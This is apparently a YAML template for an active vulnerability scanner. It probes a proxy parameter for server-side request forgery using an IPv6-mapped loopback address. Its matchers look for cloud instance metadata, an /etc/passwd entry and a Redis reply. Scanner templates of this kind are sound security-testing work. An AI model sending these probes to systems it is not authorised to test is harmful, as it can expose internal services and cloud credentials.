id: ssrf5-0769
name: 'SSRF probe in proxy'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via proxy (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      proxy:
        - 'http://[::ffff:127.0.0.1]/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
